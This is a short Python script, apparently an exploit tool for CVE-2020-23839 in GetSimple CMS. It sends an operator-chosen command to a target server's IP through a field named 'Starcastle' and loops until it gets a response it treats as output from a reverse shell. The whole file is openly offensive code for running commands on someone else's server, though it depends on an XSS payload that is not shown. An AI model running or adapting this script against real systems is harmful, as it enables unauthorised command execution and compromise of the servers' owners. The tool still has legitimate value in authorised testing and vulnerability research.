import argparse
import requests
import time


def exec_reverse_shell_command(victim_url, command):
    while True:
        try:
            # "Starcastle" is the placeholder name in evil XSS payload waiting for reverse shell input
            data = {'Starcastle': command}
            r = requests.post(victim_url, data=data, verify=False)

            status = r.status_code
            response = r.text

            # loop until sensible information arrives (no html after successful XSS and response=OK)
            if '<!DOCTYPE html>' not in response and status == 200:
                print('reverse shell activated - executed command: ' + command + '\n')
                print(response)
                break
            else:
                time.sleep(0.1)
        except:
            time.sleep(0.1)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="CVE-2020-23839 GetSimple CMS XSS exploit")
    parser.add_argument('-ip', dest='server_ip', action='store', type=str, required=True,
                        help='The IP address of the target server')
    parser.add_argument('-cmd', dest='command', action='store', type=str, required=True,
                        help='The command that will be executed in the reverse shell')
    args = parser.parse_args()

    url = 'http://' + args.server_ip
    exec_reverse_shell_command(url, args.command)
